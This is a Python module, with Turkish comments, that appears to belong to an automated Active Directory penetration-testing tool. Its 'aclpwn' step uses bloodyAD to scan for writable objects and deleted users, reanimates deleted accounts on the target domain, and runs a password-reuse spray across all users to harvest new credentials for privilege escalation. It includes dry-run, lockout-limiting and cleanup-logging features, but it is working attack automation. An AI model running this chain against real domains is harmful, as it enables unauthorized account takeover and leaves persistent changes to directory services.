"""ACL-suistimali zinciri (autopilot adımı).

Eldeki kimlikle:
  1. bloodyAD ile yazılabilir nesneleri + silinmiş (reanimate edilebilir)
     kullanıcıları tarar (bulgular rapora eklenir).
  2. Bulunan silinmiş kullanıcıları GERİ CANLANDIRIR (set restore).
  3. Parola-tekrarı süpürmesiyle (sorulan ve/veya bilinen parolalar) hem geri
     canlandırılan hesapları hem de tüm kullanıcıları dener — tekrar kullanılan
     parolaları yakalar (ör. mark.davies == alex.turner).
  4. Yeni ele geçen kimlikler rapora eklenir; escalate zinciri bunları kullanır.

Aktif AD değişikliği (restore) yaptığından yalnızca onaylı (autopilot/--aclpwn)
akışta çağrılır.
"""

from __future__ import annotations

from . import cleanup, sweep
from .findings import Credential, ScanReport
from .modules import bloodyAD_scan
from .registry import ScanContext

MAX_SWEEP_PWS = 2  # kilitlenmeyi sınırlamak için kullanıcı başına en çok bu kadar deneme


def _say(ui, text: str) -> None:
    if ui is not None:
        ui.log(text)
    else:
        print(text)


def _mark(sym: str, ui) -> str:
    color = getattr(ui, "color", False)
    return f"\033[1;32m{sym}\033[0m" if color else sym


def run(ctx: ScanContext, report: ScanReport, *, ui=None,
        sweep_pw: str | None = None) -> list[Credential]:
    """ACL zincirini yürütür; yeni ele geçen kimlikleri döndürür."""
    if not (ctx.username and (ctx.password or ctx.nthash)):
        _say(ui, "  (aclpwn: kimlik yok — ACL adımı atlandı)")
        return []

    # 1) bloodyAD writable + silinmiş kullanıcı taraması
    results = bloodyAD_scan.scan(
        ctx.target, domain=ctx.domain, username=ctx.username,
        password=ctx.password, nthash=ctx.nthash,
        timeout=ctx.timeout, dry_run=ctx.dry_run,
        use_kerberos=ctx.use_kerberos)
    n0 = len(report.findings)
    bloodyAD_scan.parse(results, report)
    for f in sorted(report.findings[n0:], key=lambda x: x.severity, reverse=True):
        from . import report as _rep
        _say(ui, _rep.render_finding(f, color=getattr(ui, "color", False)))

    deleted = bloodyAD_scan.deleted_candidates(results)

    # 2) silinmiş kullanıcıları geri canlandır
    restored: list[str] = []
    if deleted and not ctx.dry_run:
        for name, lkp in deleted:
            res = bloodyAD_scan.restore(
                ctx.target, name, domain=ctx.domain, username=ctx.username,
                password=ctx.password, nthash=ctx.nthash, timeout=ctx.timeout,
                use_kerberos=ctx.use_kerberos)
            ok = res.ok and ("restore" in res.combined.lower()
                             or "success" in res.combined.lower())
            if ok:
                restored.append(name)
                if name not in report.users:
                    report.users.append(name)
                # Temizlik: reanimation ortamda kalıcı değişikliktir. Geri alınması
                # (hesabı yeniden silme) ELLE bir karardır — uydurma komut üretmeyiz,
                # operatöre net talimatla bırakırız.
                cleanup.record(
                    "reanimation", ctx.target, name,
                    f"Silinmiş hesap '{name}' tombstone-reanimation ile geri canlandırıldı"
                    + (f" (eski konum: {lkp})." if lkp else ".")
                    + " Gerekliyse ELLE yeniden silin: bloodyAD ... remove object <DN>.",
                    module="aclpwn")
                _say(ui, f"    {_mark('↻', ui)} reanimate: {name} geri yüklendi"
                         + (f"  (eski konum: {lkp})" if lkp else ""))
            else:
                _say(ui, f"    ✘ reanimate başarısız: {name} "
                         f"({res.error or 'yetki yok olabilir'})")
    elif deleted and ctx.dry_run:
        _say(ui, f"  [PLAN] {len(deleted)} silinmiş kullanıcı restore edilecekti: "
                 + ", ".join(n for n, _ in deleted[:5]))

    # 3) parola-tekrarı süpürmesi (adaylar: tüm kullanıcılar + geri canlandırılanlar)
    candidates = list(dict.fromkeys(report.users + restored))
    passwords = _sweep_passwords(report, sweep_pw)
    if not candidates or not passwords:
        return []

    _say(ui, f"  {_mark('▸', ui)} parola-tekrarı süpürmesi: {len(candidates)} kullanıcı × "
             f"{len(passwords)} parola (kullanıcı başına ≤{len(passwords)} deneme)")
    new_all: list[Credential] = []
    for pw in passwords:
        new = sweep.sweep_password(ctx, report, pw, users=candidates, ui=ui,
                                   source="pw-sweep")
        new_all += new
    for c in new_all:
        tag = "  [ADMIN]" if c.admin else ""
        dom = f"{c.domain}\\" if c.domain else ""
        _say(ui, f"    {_mark('+', ui)} parola tekrarı: {dom}{c.username}{tag}")
    if not new_all:
        _say(ui, "    (parola tekrarı bulunamadı)")
    return new_all


def _sweep_passwords(report: ScanReport, sweep_pw: str | None) -> list[str]:
    """Süpürmede denenecek parolaları seçer (sorulan öncelikli; kilitlenme için sınırlı)."""
    pws: list[str] = []
    if sweep_pw:
        pws.append(sweep_pw)
    # bilinen açık parolalar (asked yoksa ya da farklıysa) — sınırlı sayıda
    for c in report.credentials:
        if c.kind == "password" and c.secret and c.secret not in pws:
            pws.append(c.secret)
    return pws[:MAX_SWEEP_PWS]
